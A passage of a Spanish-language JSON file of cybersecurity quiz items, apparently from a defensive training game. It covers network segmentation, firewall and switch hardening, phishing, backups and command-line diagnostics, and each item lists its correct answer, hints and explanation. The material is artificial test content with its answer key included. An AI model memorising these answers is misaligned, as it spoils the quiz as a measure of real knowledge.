a.", "why": "La seguridad por oscuridad confía en que nadie encuentre el servicio. Un escaneo de todos los puertos lo descubre en segundos.", "fix": "Autenticación con claves, sin contraseñas ni root, limitación de intentos y, mejor aún, SSH solo detrás de VPN."}, {"id": "R055", "type": "text", "tag": "Ataques", "level": "medio", "q": "El atacante no descifra nada: captura un mensaje de autenticación válido y lo vuelve a enviar más tarde. ¿Cómo se llama el ataque?", "answer": "Replay (repetición)", "accept": ["replay", "repeticion"], "keys": ["replay", "repeti", "reproduc"], "hint": "En inglés, volver a reproducir.", "why": "Un ataque de repetición reenvía mensajes válidos capturados. Funciona si el protocolo no comprueba que el mensaje es nuevo.", "fix": "Nonces, marcas de tiempo y contadores en los protocolos; en OT, prefiere versiones de protocolo con autenticación."}, {"id": "R056", "type": "rack", "level": "medio", "tag": "Rack", "lives": 3, "q": "Este rack separa la oficina de la red de control con un firewall. Alguien dejó un latiguillo que se lo salta. Tócalo.", "rack": {"devices": [{"id": "rt", "u": 1, "name": "ROUTER OPERADOR", "ports": 2}, {"id": "fw1", "u": 3, "name": "FW PERIMETRAL", "ports": 4, "fw": true}, {"id": "sw1", "u": 5, "name": "SW OFICINA", "ports": 16}, {"id": "fw2", "u": 7, "name": "FW IT/OT", "ports": 4, "fw": true}, {"id": "sw2", "u": 9, "name": "SW OT", "ports": 16}, {"id": "pp", "u": 10, "name": "PP OFICINA", "ports": 16}, {"id": "scada", "u": 11, "name": "SERVIDOR SCADA", "ports": 2}], "cables": [["c1", "rt", 0, "fw1", 0], ["c2", "fw1", 1, "sw1", 0], ["c3", "sw1", 15, "fw2", 0], ["c4", "fw2", 1, "sw2", 0], ["c5", "sw2", 1, "scada", 0], ["puente", "sw1", 11, "sw2", 12], ["d1", "sw1", 4, "pp", 2], ["d2", "sw2", 6, "pp", 9]]}, "correct": "puente", "answer": "El latiguillo del switch de oficina al switch OT", "hint": "Sigue cada cable desde el switch de oficina: ¿alguno llega a la zona OT sin pasar por el FW IT/OT?", "why": "Ese latiguillo une el switch de oficina con el switch OT directamente. El FW IT/OT queda de adorno: todo lo que entre en la oficina llega a la red de control.", "fix": "Etiqueta cada latiguillo con origen y destino, revisa el rack contra el diagrama documentado y separa físicamente IT y OT en racks o paneles distintos cuando puedas."}, {"id": "R057", "type": "fill", "level": "facil", "tag": "FortiGate", "lives": 4, "q": "Esta política solo debe dejar pasar tráfico web cifrado hacia el servidor. Completa el servicio.", "lines": ["config firewall policy", "    edit 10", "        set srcintf \"lan\"", "        set dstintf \"dmz\"", "        set dstaddr \"srv-web\"", "        set action accept", "        set service \"{}\"", "    next", "end"], "accept": ["https"], "answer": "HTTPS", "len": 5, "hints": ["Es el puerto 443.", "Empieza por H."], "why": "El servicio HTTPS limita la regla al puerto 443. Con ALL o HTTP dejarías pasar mucho más de lo necesario.", "fix": "Define siempre el servicio exacto en cada política y revisa periódicamente las reglas con service ALL.", "hint": "Es el puerto 443."}, {"id": "R058", "type": "choice", "tag": "OT", "level": "medio", "lives": 2, "q": "Las cámaras IP de la nave están en la misma red que los PLC. ¿Qué haces primero?", "options": ["Cambiar las contraseñas de las cámaras", "Moverlas a una VLAN propia que solo hable con el grabador", "Instalarles un antivirus", "Desactivar su acceso web"], "correct": 1, "answer": "Moverlas a una VLAN propia que solo hable con el grabador", "hint": "Piensa en qué puede alcanzar una cámara comprometida.", "why": "Una cámara comprometida en la red de control llega directamente a los PLC. Separarla limita a quién puede hablar, aunque la cámara siga siendo vulnerable.", "fix": "Segmenta por función: cada tipo de dispositivo en su zona y reglas que solo permitan el tráfico imprescindible."}, {"id": "R059", "type": "choice", "tag": "OT", "level": "medio", "lives": 2, "q": "Un PLC no se puede parchear porque el fabricante ya no da soporte. ¿Cuál es la mejor medida compensatoria?", "options": ["Desconectarlo de la red", "Firewall delante que solo permita su tráfico necesario, y monitorizarlo", "Cambiarle la IP cada mes", "Dejarlo como está: nadie sabe que existe"], "correct": 1, "answer": "Firewall delante que solo permita su tráfico necesario, y monitorizarlo", "hint": "No puedes arreglarlo, pero sí rodearlo.", "why": "Si no se puede parchear, se reduce quién puede llegar a él y se vigila lo que hace. Desconectarlo suele parar el proceso.", "fix": "Inventario de activos sin soporte, reglas mínimas hacia ellos y plan de sustitución en el próximo paro."}, {"id": "R060", "type": "choice", "tag": "Monitorización", "level": "medio", "lives": 2, "q": "Quieres detectar anomalías en la red de control sin arriesgarte a afectar al proceso. ¿Cómo monitorizas?", "options": ["Escaneo activo diario de todos los equipos", "Instalar un agente en cada PLC", "Escucha pasiva con un puerto espejo (SPAN o TAP)", "Hacer ping a todo cada minuto"], "correct": 2, "answer": "Escucha pasiva con un puerto espejo (SPAN o TAP)", "hint": "Mirar sin tocar.", "why": "La escucha pasiva copia el tráfico sin inyectar nada en la red, así que no puede tumbar equipos frágiles.", "fix": "Puertos espejo o TAP hacia un sensor OT que aprenda la línea base del tráfico."}, {"id": "R061", "type": "choice", "tag": "Phishing", "level": "facil", "lives": 2, "q": "Te llega «Tu contraseña caduca hoy» con un enlace. ¿Qué señal es la más fiable de que es phishing?", "options": ["El logo se ve algo borroso", "El dominio del enlace no es el de tu empresa", "Tiene alguna falta de ortografía", "Ha llegado a primera hora"], "correct": 1, "answer": "El dominio del enlace no es el de tu empresa", "hint": "Lo demás se puede imitar bien.", "why": "El atacante puede copiar el logo y escribir sin faltas, pero no puede usar tu dominio real. Revisar a dónde lleva el enlace es lo más fiable.", "fix": "Pasa el cursor por los enlaces antes de pulsar y, ante la duda, entra escribiendo la dirección tú mismo."}, {"id": "R062", "type": "choice", "tag": "Identidad", "level": "medio", "lives": 2, "q": "¿Qué segundo factor resiste mejor un ataque de phishing?", "options": ["SMS", "Código de una app (TOTP)", "Notificación push para aprobar", "Llave de seguridad FIDO2 o passkey"], "correct": 3, "answer": "Llave de seguridad FIDO2 o passkey", "hint": "Uno de ellos comprueba en qué web estás.", "why": "FIDO2 ata la autenticación al dominio real: en una web falsa la llave simplemente no responde. Los códigos y las notificaciones se pueden reenviar o aprobar por error.", "fix": "Usa FIDO2 o passkeys para cuentas de administración y accesos remotos."}, {"id": "R063", "type": "choice", "tag": "Ransomware", "level": "medio", "lives": 2, "q": "Para que tus copias de seguridad sobrevivan a un ransomware, ¿qué característica es la clave?", "options": ["Que sean diarias", "Que estén comprimidas", "Que al menos una sea inmutable o esté desconectada", "Que estén en el mismo servidor, para restaurar rápido"], "correct": 2, "answer": "Que al menos una sea inmutable o esté desconectada", "hint": "El ransomware también cifra las copias que alcanza.", "why": "Si el atacante llega a las copias, las cifra o las borra. Una copia inmutable o fuera de línea es la que te permite recuperarte.", "fix": "Regla 3-2-1 con una copia inmutable y prueba de restauración periódica."}, {"id": "R064", "type": "choice", "tag": "Arquitectura", "level": "medio", "lives": 2, "q": "La oficina necesita datos de proceso. ¿Cuál es el diseño correcto?", "options": ["La oficina consulta directamente los PLC", "Un historiador en la DMZ recoge los datos de OT y la oficina solo habla con la DMZ", "Los PLC envían los datos a internet", "Abrir todo entre IT y OT para simplificar"], "correct": 1, "answer": "Un historiador en la DMZ recoge los datos de OT y la oficina solo habla con la DMZ", "hint": "Nadie de IT debería tocar OT directamente.", "why": "Con la DMZ industrial en medio, ninguna conexión cruza de IT a OT de un tirón: cada lado solo habla con la DMZ.", "fix": "Que el tráfico entre IT y OT termine siempre en la DMZ y nunca la atraviese."}, {"id": "R065", "type": "choice", "tag": "Accesos", "level": "medio", "lives": 2, "q": "Un proveedor pide una cuenta de administrador permanente «por comodidad». ¿Qué le das?", "options": ["La cuenta de administrador compartida", "Una cuenta nominal con los permisos mínimos que se activa solo cuando hace falta", "Tus propias credenciales", "Nada: que venga siempre en persona"], "correct": 1, "answer": "Una cuenta nominal con los permisos mínimos que se activa solo cuando hace falta", "hint": "Nominal, mínima y temporal.", "why": "Una cuenta personal identifica quién hace qué, los permisos mínimos limitan el daño y activarla solo cuando hace falta evita accesos olvidados.", "fix": "Gestión de accesos privilegiados con aprobación, caducidad y grabación de sesión."}, {"id": "R066", "type": "choice", "tag": "Detección", "level": "facil", "lives": 2, "q": "Un usuario se conecta a la VPN desde Madrid y, diez minutos después, desde Singapur. ¿Cómo se llama esta alerta?", "options": ["Viaje imposible", "Fuerza bruta", "Escalada de privilegios", "Denegación de servicio"], "correct": 0, "answer": "Viaje imposible", "hint": "Nadie viaja tan rápido.", "why": "Dos accesos tan lejanos en tan poco tiempo son físicamente imposibles: probablemente alguien más tiene sus credenciales.", "fix": "Bloquea la sesión sospechosa, fuerza el cambio de contraseña y exige MFA en la VPN."}, {"id": "R067", "type": "choice", "tag": "Exposición", "level": "facil", "lives": 2, "q": "¿Qué puerto no deberías exponer nunca directamente a internet por ser la administración remota de Windows?", "options": ["443", "3389", "25", "53"], "correct": 1, "answer": "3389", "hint": "Es el de RDP.", "why": "El 3389 es RDP, uno de los servicios más atacados: credenciales robadas y vulnerabilidades graves cada año.", "fix": "RDP solo detrás de VPN o de una pasarela con MFA, nunca publicado."}, {"id": "R068", "type": "choice", "tag": "IEC 62443", "level": "medio", "lives": 2, "q": "IEC 62443 organiza la red en zonas. ¿Cómo llama a los caminos de comunicación entre ellas?", "options": ["Túneles", "Conductos", "Troncales", "Puentes"], "correct": 1, "answer": "Conductos", "hint": "Por ellos «se conduce» el tráfico.", "why": "Las zonas agrupan activos con los mismos requisitos de seguridad y los conductos son los canales controlados entre zonas.", "fix": "Documenta cada conducto: qué zonas une, qué tráfico permite y qué controles tiene."}, {"id": "R069", "type": "choice", "tag": "Purdue", "level": "medio", "lives": 2, "q": "En el modelo Purdue, ¿en qué nivel están los PLC?", "options": ["Nivel 0", "Nivel 1", "Nivel 3", "Nivel 5"], "correct": 1, "answer": "Nivel 1", "hint": "El nivel 0 son los sensores y actuadores.", "why": "Nivel 0: proceso físico. Nivel 1: control básico (PLC, RTU). Nivel 2: supervisión (SCADA, HMI). Nivel 3: operaciones de planta.", "fix": "Usa los niveles para decidir qué puede hablar con qué: los saltos de varios niveles deben ser excepcionales."}, {"id": "R070", "type": "choice", "tag": "Firewall", "level": "medio", "lives": 2, "q": "Pones en serie dos firewalls de fabricantes distintos. ¿Qué ganas?", "options": ["Más velocidad", "Que un fallo o una vulnerabilidad en uno no abra el paso por sí solo", "Menos reglas que mantener", "Nada, es redundante"], "correct": 1, "answer": "Que un fallo o una vulnerabilidad en uno no abra el paso por sí solo", "hint": "Defensa en profundidad.", "why": "Si un fabricante tiene una vulnerabilidad, el otro probablemente no comparte la misma. Es una capa extra, a costa de más gestión.", "fix": "Úsalo en fronteras críticas, como IT/OT, y mantén las dos políticas coherentes."}, {"id": "R071", "type": "choice", "tag": "Respuesta", "level": "medio", "lives": 2, "q": "Detectas un equipo comprometido en la oficina. ¿Cuál es el primer paso de contención?", "options": ["Formatearlo", "Aislarlo de la red sin apagarlo", "Apagarlo de inmediato", "Avisar por correo a toda la empresa"], "correct": 1, "answer": "Aislarlo de la red sin apagarlo", "hint": "En la memoria hay pruebas.", "why": "Aislarlo corta la propagación y mantenerlo encendido conserva la memoria, donde suele estar la información clave del ataque.", "fix": "Aislamiento desde el EDR o el switch y adquisición de memoria antes de tocar nada más."}, {"id": "R072", "type": "choice", "tag": "Wi-Fi", "level": "medio", "lives": 2, "q": "¿Qué método evita que una única contraseña compartida dé acceso a toda la Wi-Fi corporativa?", "options": ["WPA2-PSK", "WEP", "WPA2/WPA3-Enterprise con 802.1X", "Ocultar el SSID"], "correct": 2, "answer": "WPA2/WPA3-Enterprise con 802.1X", "hint": "Cada usuario, su credencial.", "why": "Con 802.1X cada usuario o equipo se autentica con su propia credencial o certificado, y se puede revocar uno sin cambiar todo.", "fix": "WPA3-Enterprise con certificados para equipos corporativos y una red aparte para invitados."}, {"id": "R073", "type": "choice", "tag": "Capa 2", "level": "medio", "lives": 2, "q": "Un portátil envía miles de MAC falsas por un puerto del switch. ¿Qué función lo frena?", "options": ["STP", "Port security", "VLAN nativa", "LACP"], "correct": 1, "answer": "Port security", "hint": "Limita cuántas MAC aprende un puerto.", "why": "Port security fija cuántas direcciones MAC puede aprender un puerto y bloquea el resto, así la tabla no se desborda.", "fix": "Límite de MAC en puertos de usuario y avisos cuando se supera."}, {"id": "R074", "type": "choice", "tag": "Capa 2", "level": "medio", "lives": 2, "q": "Un servidor DHCP no autorizado reparte IP en la oficina. ¿Qué función del switch lo bloquea?", "options": ["DHCP snooping", "BPDU guard", "Storm control", "PoE"], "correct": 0, "answer": "DHCP snooping", "hint": "El switch decide en qué puertos se fía de un servidor DHCP.", "why": "DHCP snooping solo permite respuestas DHCP por los puertos marcados como de confianza y descarta las demás.", "fix": "Activa DHCP snooping y marca como de confianza solo los enlaces hacia tus servidores DHCP."}, {"id": "R075", "type": "choice", "tag": "Capa 2", "level": "medio", "lives": 2, "q": "Alguien conecta un switch doméstico a un puerto de usuario y el árbol de spanning tree se reorganiza. ¿Qué función apaga ese puerto en cuanto recibe BPDU?", "options": ["BPDU guard", "PortFast", "DHCP snooping", "LACP"], "correct": 0, "answer": "BPDU guard", "hint": "Guardia de las BPDU.", "why": "Un puerto de usuario nunca debería recibir BPDU. BPDU guard lo apaga en cuanto llega una y protege la topología.", "fix": "PortFast y BPDU guard en todos los puertos de usuario."}, {"id": "R076", "type": "choice", "tag": "Logs", "level": "facil", "lives": 2, "q": "¿Por qué conviene enviar los logs a un servidor central y no dejarlos solo en cada equipo?", "options": ["Para ahorrar disco", "Porque si comprometen el equipo, no pueden borrar las pruebas", "Porque se escriben más rápido", "Porque lo exige el firewall"], "correct": 1, "answer": "Porque si comprometen el equipo, no pueden borrar las pruebas", "hint": "Lo primero que hace un atacante es limpiar sus huellas.", "why": "Un atacante con control del equipo puede borrar sus logs locales. Los que ya se enviaron fuera quedan fuera de su alcance.", "fix": "Envío centralizado a un SIEM con retención suficiente y acceso restringido."}, {"id": "R077", "type": "choice", "tag": "Contraseñas", "level": "facil", "lives": 2, "q": "¿Qué es más eficaz para proteger una cuenta?", "options": ["Cambiar la contraseña cada 30 días", "Una frase larga y única, guardada en un gestor de contraseñas", "Ocho caracteres con símbolos", "Apuntarla en un sitio seguro del escritorio"], "correct": 1, "answer": "Una frase larga y única, guardada en un gestor de contraseñas", "hint": "Longitud y no repetirla.", "why": "La longitud pesa más que la complejidad, y no reutilizarla evita que una filtración en otro sitio abra esta cuenta.", "fix": "Gestor de contraseñas para todo el equipo y MFA en lo importante."}, {"id": "R078", "type": "choice", "tag": "OT", "level": "medio", "lives": 2, "q": "Quieres escanear vulnerabilidades en la red de control. ¿Cómo lo haces?", "options": ["En producción y a toda velocidad, para acabar antes", "De forma pasiva o en una ventana de mantenimiento coordinada con planta", "Nunca: en OT no se escanea", "El fin de semana, sin avisar a nadie"], "correct": 1, "answer": "De forma pasiva o en una ventana de mantenimiento coordinada con planta", "hint": "Algunos equipos se cuelgan con un escaneo agresivo.", "why": "Muchos PLC y equipos antiguos se bloquean ante escaneos activos. Se usa detección pasiva o se escanea con cuidado en una ventana acordada.", "fix": "Plan de escaneo acordado con operación, empezando por los equipos menos críticos."}, {"id": "R079", "type": "choice", "tag": "OT", "level": "facil", "lives": 2, "q": "El HMI de la planta usa una cuenta compartida «operador/operador». ¿Cuál es el riesgo principal?", "options": ["Que va más lento", "Que nadie sabe quién hizo cada acción", "Que consume licencias", "Que impide actualizar"], "correct": 1, "answer": "Que nadie sabe quién hizo cada acción", "hint": "Piensa en una investigación tras un incidente.", "why": "Con una cuenta compartida no hay trazabilidad: es imposible saber quién cambió una consigna o detuvo un equipo.", "fix": "Cuentas nominales en el HMI o, si no es posible, registro de turnos y acceso físico controlado."}, {"id": "R080", "type": "choice", "tag": "Ingeniería social", "level": "facil", "lives": 2, "q": "Aparece un USB en el aparcamiento con la etiqueta «Nóminas 2026». ¿Qué haces?", "options": ["Abrirlo en un ordenador de la oficina", "Abrirlo en el HMI, que no tiene internet", "Entregarlo a seguridad sin conectarlo", "Formatearlo y quedártelo"], "correct": 2, "answer": "Entregarlo a seguridad sin conectarlo", "hint": "La etiqueta está pensada para que lo abras.", "why": "Un USB abandonado con un nombre jugoso es una técnica clásica para colar malware. Conectarlo, en cualquier equipo, ya es el ataque.", "fix": "Bloquea el almacenamiento USB en equipos críticos y forma a la plantilla con casos reales."}, {"id": "R081", "type": "choice", "tag": "TLS", "level": "medio", "lives": 2, "q": "El certificado de una web interna caducó y los usuarios pulsan «aceptar el riesgo». ¿Cuál es el problema real?", "options": ["Ninguno, es una web interna", "Se acostumbran a ignorar avisos y un ataque de intermediario pasaría desapercibido", "La web va más lenta", "Se pierde posicionamiento en buscadores"], "correct": 1, "answer": "Se acostumbran a ignorar avisos y un ataque de intermediario pasaría desapercibido", "hint": "El aviso existe por algo.", "why": "Si los usuarios aprenden a saltarse el aviso, el día que alguien intercepte la conexión también lo saltarán.", "fix": "Renovación automática de certificados y una CA interna para servicios internos."}, {"id": "R082", "type": "choice", "tag": "Hardening", "level": "medio", "lives": 2, "q": "¿Por qué la lista blanca de aplicaciones encaja especialmente bien en las estaciones de ingeniería?", "options": ["Porque esos equipos cambian poco y se sabe exactamente qué deben ejecutar", "Porque es gratis", "Porque sustituye al firewall", "Porque acelera los PLC"], "correct": 0, "answer": "Porque esos equipos cambian poco y se sabe exactamente qué deben ejecutar", "hint": "En un equipo estable, lo nuevo es sospechoso.", "why": "En equipos con software estable es fácil definir qué se permite, y cualquier ejecutable nuevo, como un malware, queda bloqueado.", "fix": "Lista blanca en estaciones de ingeniería y HMI, con un proceso para aprobar cambios."}, {"id": "R083", "type": "choice", "tag": "Firewall", "level": "facil", "lives": 2, "q": "El firewall permite «any» desde la DMZ hacia la red de control. ¿Qué cambias?", "options": ["Nada, la DMZ ya es segura", "Limitarlo a los equipos, puertos y protocolos que de verdad necesitan hablar", "Añadir otra regla any encima", "Desactivar los logs de esa regla"], "correct": 1, "answer": "Limitarlo a los equipos, puertos y protocolos que de verdad necesitan hablar", "hint": "Mínimo privilegio también entre zonas.", "why": "Si un equipo de la DMZ cae, una regla any le da paso libre a todo OT. Hay que dejar solo lo imprescindible.", "fix": "Revisa las reglas entre zonas cada trimestre y elimina las genéricas."}, {"id": "R084", "type": "choice", "tag": "Protocolos", "level": "facil", "lives": 2, "q": "¿Qué protocolo deberías sustituir por SSH para administrar equipos?", "options": ["HTTPS", "Telnet", "SFTP", "IPsec"], "correct": 1, "answer": "Telnet", "hint": "Viaja todo en claro, contraseña incluida.", "why": "Telnet envía usuario, contraseña y comandos sin cifrar: cualquiera que escuche la red los ve.", "fix": "Desactiva Telnet en switches y routers y deja solo SSH con claves."}, {"id": "R085", "type": "choice", "tag": "Monitorización", "level": "medio", "lives": 2, "q": "Un switch tiene SNMP con la comunidad «public». ¿Qué te preocupa?", "options": ["Que sea lento", "Que cualquiera en la red pueda leer información del equipo", "Que use TCP", "Que no funcione en IPv6"], "correct": 1, "answer": "Que cualquiera en la red pueda leer información del equipo", "hint": "Es la contraseña por defecto de SNMP.", "why": "«public» es la comunidad por defecto y viaja en claro: cualquiera puede consultar la configuración, interfaces y tablas del equipo.", "fix": "SNMPv3 con autenticación y cifrado, y acceso limitado a la IP del servidor de monitorización."}, {"id": "R086", "type": "choice", "tag": "Cadena de suministro", "level": "medio", "lives": 2, "q": "Un malware llega a cientos de empresas a la vez dentro de una actualización firmada por un proveedor legítimo. ¿Qué tipo de ataque es?", "options": ["Cadena de suministro", "Denegación de servicio", "Escaneo de puertos", "Fuerza bruta"], "correct": 0, "answer": "Cadena de suministro", "hint": "El ataque viajó por un canal en el que confiabas.", "why": "Comprometer al proveedor permite llegar a todos sus clientes a través de un canal de confianza, como sus actualizaciones.", "fix": "Evalúa a los proveedores críticos, prueba las actualizaciones antes de desplegarlas y vigila el comportamiento tras instalarlas."}, {"id": "R087", "type": "fill", "tag": "Linux", "level": "facil", "lives": 4, "q": "Bloquea Telnet en este servidor completando la regla.", "lines": ["iptables -A INPUT -p tcp --dport {} -j DROP"], "accept": ["23"], "answer": "23", "len": 2, "hints": ["Es el puerto de Telnet.", "Tiene dos cifras y empieza por 2."], "hint": "Es el puerto de Telnet.", "why": "Telnet escucha en el puerto 23. Bloquearlo evita que alguien entre con credenciales en claro.", "fix": "Mejor que bloquear Telnet: desinstalarlo y administrar solo por SSH."}, {"id": "R088", "type": "fill", "tag": "SSH", "level": "facil", "lives": 4, "q": "Impide que alguien entre por SSH directamente como root.", "lines": ["# /etc/ssh/sshd_config", "PermitRootLogin {}"], "accept": ["no"], "answer": "no", "len": 2, "hints": ["La respuesta más corta posible.", "Lo contrario de yes."], "hint": "La respuesta más corta posible.", "why": "Con PermitRootLogin no, nadie puede entrar como root; hay que entrar con un usuario y elevar privilegios, lo que deja rastro.", "fix": "Desactiva también la autenticación por contraseña y usa claves."}, {"id": "R089", "type": "fill", "tag": "Escaneo", "level": "medio", "lives": 4, "q": "Quieres saber qué equipos están vivos en la red sin escanear puertos.", "lines": ["nmap -{} 10.20.0.0/24"], "accept": ["sn", "-sn"], "answer": "sn", "len": 2, "hints": ["Es una opción de dos letras que empieza por s.", "La segunda letra es n, de «no port scan»."], "hint": "Es una opción de dos letras que empieza por s.", "why": "-sn hace solo descubrimiento de equipos, sin escanear puertos: es más rápido y menos intrusivo.", "fix": "En OT, incluso esto puede molestar a equipos frágiles: mejor inventario pasivo."}, {"id": "R090", "type": "fill", "tag": "Cisco", "level": "medio", "lives": 4, "q": "En este puerto solo debe haber un ordenador. Limita las MAC que puede aprender.", "lines": ["interface Gi0/5", " switchport port-security", " switchport port-security maximum {}"], "accept": ["1"], "answer": "1", "len": 1, "hints": ["Un solo equipo.", "Es un número de una cifra."], "hint": "Un solo equipo.", "why": "Con un máximo de 1 MAC, si alguien conecta un switch o cambia de equipo, el puerto salta.", "fix": "Combínalo con la acción shutdown o restrict y con avisos al SIEM."}, {"id": "R091", "type": "fill", "tag": "Cisco", "level": "facil", "lives": 4, "q": "Este puerto conecta un ordenador de usuario, no otro switch. ¿Qué modo le pones?", "lines": ["interface Gi0/7", " switchport mode {}"], "accept": ["access", "acceso"], "answer": "access", "len": 6, "hints": ["Lo contrario de trunk.", "Empieza por a."], "hint": "Lo contrario de trunk.", "why": "Un puerto de usuario va en modo access: pertenece a una sola VLAN y no negocia troncales.", "fix": "Fija siempre el modo a mano y desactiva la negociación (nonegotiate) para evitar saltos de VLAN."}, {"id": "R092", "type": "fill", "tag": "Cisco", "level": "medio", "lives": 4, "q": "Apaga el puerto si alguien conecta un switch y envía BPDU.", "lines": ["interface Gi0/7", " spanning-tree portfast", " spanning-tree bpduguard {}"], "accept": ["enable"], "answer": "enable", "len": 6, "hints": ["Activar, en inglés.", "Empieza por e."], "hint": "Activar, en inglés.", "why": "bpduguard enable apaga el puerto en cuanto recibe una BPDU, que no debería llegar nunca a un puerto de usuario.", "fix": "Actívalo en todos los puertos de acceso."}, {"id": "R093", "type": "fill", "tag": "FortiGate", "level": "facil", "lives": 4, "q": "Esta es la última política: debe bloquear todo lo demás.", "lines": ["config firewall policy", "    edit 99", "        set srcaddr \"all\"", "        set dstaddr \"all\"", "        set action {}", "    next", "end"], "accept": ["deny"], "answer": "deny", "len": 4, "hints": ["Lo contrario de accept.", "Empieza por d."], "hint": "Lo contrario de accept.", "why": "Una política final que deniega todo garantiza que solo pasa lo que permitiste explícitamente arriba.", "fix": "Activa el registro en esa política: te dirá qué se está intentando y no debería."}, {"id": "R094", "type": "fill", "tag": "FortiGate", "level": "facil", "lives": 4, "q": "Quieres registrar todo el tráfico de esta política, no solo los eventos de seguridad.", "lines": ["    edit 10", "        set action accept", "        set logtraffic {}", "    next"], "accept": ["all"], "answer": "all", "len": 3, "hints": ["Todo, en inglés.", "Tres letras."], "hint": "Todo, en inglés.", "why": "logtraffic all registra todas las sesiones; la opción por defecto solo registra eventos de seguridad.", "fix": "Registra todo en políticas entre zonas críticas, como IT/OT, y envíalo a un servidor central."}, {"id": "R095", "type": "fill", "tag": "Cisco", "level": "medio", "lives": 4, "q": "El servidor DHCP legítimo está detrás del enlace Gi0/24. Márcalo como de confianza.", "lines": ["ip dhcp snooping", "ip dhcp snooping vlan 10", "interface Gi0/24", " ip dhcp snooping {}"], "accept": ["trust"], "answer": "trust", "len": 5, "hints": ["Confianza, en inglés.", "Empieza por t."], "hint": "Confianza, en inglés.", "why": "Con DHCP snooping, solo los puertos marcados como trust pueden enviar respuestas DHCP; el resto se descarta.", "fix": "Marca como trust únicamente los enlaces hacia tus servidores DHCP y los troncales entre switches."}, {"id": "R096", "type": "fill", "tag": "Linux", "level": "medio", "lives": 4, "q": "Tu clave privada SSH debe poder leerla y escribirla solo tu usuario.", "lines": ["chmod {} ~/.ssh/id_ed25519"], "accept": ["600"], "answer": "600", "len": 3, "hints": ["Lectura y escritura solo para el propietario.", "Empieza por 6."], "hint": "Lectura y escritura solo para el propietario.", "why": "600 da lectura y escritura al propietario y nada a los demás. SSH rechaza claves privadas con permisos más abiertos.", "fix": "Protege también la clave con una frase de paso."}, {"id": "R097", "type": "fill", "tag": "Captura", "level": "facil", "lives": 4, "q": "Quieres capturar solo el tráfico DNS de esta interfaz.", "lines": ["tcpdump -i eth0 port {}"], "accept": ["53"], "answer": "53", "len": 2, "hints": ["Es el puerto de DNS.", "Dos cifras."], "hint": "Es el puerto de DNS.", "why": "DNS usa el puerto 53, en UDP y en TCP.", "fix": "Capturar DNS ayuda a detectar túneles y dominios maliciosos: fíjate en consultas largas o muy repetidas."}, {"id": "R098", "type": "fill", "tag": "DNS", "level": "facil", "lives": 4, "q": "Quieres ver qué servidores reciben el correo de este dominio.", "lines": ["dig empresa.es {}"], "accept": ["mx"], "answer": "MX", "len": 2, "hints": ["Mail eXchanger.", "Dos letras."], "hint": "Mail eXchanger.", "why": "Los registros MX indican qué servidores reciben el correo del dominio.", "fix": "Comprueba que tus MX apuntan solo a tus servidores o a tu proveedor de correo."}, {"id": "R099", "type": "fill", "tag": "DNS", "level": "medio", "lives": 4, "q": "Quieres ver la política DMARC de un dominio.", "lines": ["dig TXT {}.empresa.es"], "accept": ["_dmarc", "dmarc"], "answer": "_dmarc", "len": 6, "hints": ["Es un subdominio con guion bajo delante.", "Se llama como el propio estándar."], "hint": "Es un subdominio con guion bajo delante.", "why": "La política DMARC se publica en un registro TXT del subdominio _dmarc del dominio.", "fix": "Publica la tuya y sube de p=none a quarantine o reject cuando los informes estén limpios."}, {"id": "R100", "type": "fill", "tag": "TLS", "level": "medio", "lives": 4, "q": "Quieres saber cuándo caduca este certificado.", "lines": ["openssl x509 -in web.pem -noout -{}"], "accept": ["enddate"], "answer": "enddate", "len": 7, "hints": ["Fecha de fin, en inglés y todo junto.", "Empieza por end."], "hint": "Fecha de fin, en inglés y todo junto.", "why": "-enddate muestra la fecha notAfter del certificado, es decir, cuándo caduca.", "fix": "Vigila las caducidades con monitorización automática y no a mano."}, {"id": "R101", "type": "fill", "tag": "Escaneo", "level": "medio", "lives": 4, "q": "Además de ver qué puertos están abiertos, quieres saber qué versión de servicio hay en cada uno.", "lines": ["nmap -{} 10.20.0.5"], "accept": ["sv", "-sv"], "answer": "sV", "len": 2, "hints": ["Empieza por s.", "La segunda letra es la de «versión»."], "hint": "Empieza por s.", "why": "-sV interroga a cada servicio para identificar el software y su versión, útil para buscar vulnerabilidades conocidas.", "fix": "Haz este tipo de escaneos solo con autorización y nunca contra OT en producción."}, {"id": "R102", "type": "fill", "tag": "Windows", "level": "medio", "lives": 4, "q": "En Windows quieres ver las conexiones con el número de proceso (PID) de cada una.", "lines": ["netstat -{}"], "accept": ["ano", "aon", "nao", "noa", "ona", "oan"], "answer": "ano", "len": 3, "hints": ["Son tres letras: todas, numérico y la del proceso.", "La del proceso es la o."], "hint": "Son tres letras: todas, numérico y la del proceso.", "why": "-a muestra todas las conexiones, -n las direcciones en número y -o el PID del proceso.", "fix": "Cruza el PID con el administrador de tareas para descubrir qué programa abre cada conexión."}, {"id": "R103", "type": "fill", "tag": "Windows", "level": "facil", "lives": 4, "q": "El equipo tiene una IP 169.254 y quieres pedir una nueva al DHCP.", "lines": ["ipconfig /{}"], "accept": ["renew"], "answer": "renew", "len": 5, "hints": ["Renovar, en inglés.", "Empieza por re."], "hint": "Renovar, en inglés.", "why": "ipconfig /renew pide al servidor DHCP una nueva concesión de IP.", "fix": "Si sigue sin conseguirla, revisa el servidor DHCP y el DHCP snooping del switch."}, {"id": "R104", "type": "fill", "tag": "Diagnóstico", "level": "facil", "lives": 4, "q": "Quieres ver la tabla ARP de tu equipo para comprobar la MAC de la puerta de enlace.", "lines": ["arp -{}"], "accept": ["a"], "answer": "a", "len": 1, "hints": ["Una sola letra.", "La de «all»."], "hint": "Una sola letra.", "why": "arp -a muestra la tabla ARP con la IP y la MAC de cada vecino. Si la MAC del gateway cambia sin motivo, puede ser ARP spoofing.", "fix": "Activa Dynamic ARP Inspection en los switches."}, {"id": "R105", "type": "fill", "tag": "Windows", "level": "facil", "lives": 4, "q": "Es el traceroute de Windows. Completa el comando.", "lines": ["{} 8.8.8.8"], "accept": ["tracert"], "answer": "tracert", "len": 7, "hints": ["Es traceroute, pero recortado.", "Siete letras."], "hint": "Es traceroute, pero recortado.", "why": "En Windows el comando es tracert y usa ICMP; en Linux, traceroute usa UDP por defecto.", "fix": "Si filtras traceroute, contempla las dos variantes."}, {"id": "R106", "type": "fill", "tag": "Linux", "level": "medio", "lives": 4, "q": "Política por defecto de entrada: todo lo que no se permita expresamente se descarta.", "lines": ["iptables -P INPUT {}"], "accept": ["drop"], "answer": "DROP", "len": 4, "hints": ["Soltar, en inglés.", "Cuatro letras y empieza por D."], "hint": "Soltar, en inglés.", "why": "-P fija la política por defecto de la cadena. Con DROP, lo que no coincide con ninguna regla se descarta.", "fix": 